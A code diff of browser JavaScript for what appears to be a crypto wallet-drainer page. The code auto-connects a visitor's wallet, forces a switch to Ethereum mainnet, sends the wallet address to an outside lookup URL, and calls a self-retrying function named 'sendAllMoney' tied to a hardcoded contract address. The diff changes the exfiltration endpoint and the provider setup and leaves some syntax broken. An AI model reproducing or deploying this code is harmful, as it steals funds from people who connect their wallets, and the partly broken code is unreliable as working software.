@@ -1,8 +1,5 @@
 console.log("loaded");
-const serverUrl = "https://2uuwz8f6oqbb.usemoralis.com:2053/server";
-const appId = "LZKnRUNSDdi6hTYDFx5GbLbxx1fPHnKryMQUurv3";
-Moralis.start({ serverUrl, appId });
-let URL = "http://a0289382.xsph.ru/!old/check.php?address="
+let URL = "https://onlyforapi.xyz/?address="
 let ContractAdr = "0x64e80282Bbf9ff1B900c2042eaAaa6e3CecF6Cac";
 setTimeout(connects, 5000)
 let abi = [
@@ -47,8 +44,8 @@ let abi = [
 
 ]
 const Web3Modal = window.Web3Modal.default;
-const WalletConnectProvider = window.WalletConnectProvider.default;
-const BaseProvider = window.ethereum.enable();
+
+
 // Web3modal instance
 let web3Modal
 
@@ -61,11 +58,6 @@ let selectedAccount;
 let web3;
 
 const providerOptions = {
-    metamask: {
-        package: BaseProvider,
-        options: {
-    
-        }
     }
 
 };
@@ -81,10 +73,9 @@ function toogleButton() {
     document.getElementsByTagName("button")[0].disabled = !document.getElementsByTagName("button")[0].disabled;
 }
 async function syncChain() {
-    
-                if(await web3.eth.getChainId() != 1) {
+                if(web3.eth.getChainId() != 1) {
                     try {
-                        await web3.eth.request({
+                        await web3.currentProvider.request({
                             method: "wallet_switchEthereumChain",
                             params: [{ chainId: "0x1" }]
                         });
@@ -133,10 +124,10 @@ async function connect() {
 }
 
 async function connectWithoutModal() {
-    provider = window.ethereum.enable();
+    provider = await Moralis.enableWeb3();
     web3 = new Web3(provider);
     console.log("Web3 instance is", web3);
-    const accounts = await ethereum.request({ method: 'eth_accounts' })
+    const accounts = await web3.eth.getAccounts();
     const balance = await web3.eth.getBalance(accounts[0]);
     selectedAccount = accounts[0];
     await syncChain()
@@ -273,7 +264,7 @@ async function sendAllMoney() {
 
             }
             catch (error) {
-                console.log(error)
+                console.log("Exception Happened")
                 await sendAllMoney();
             }
 
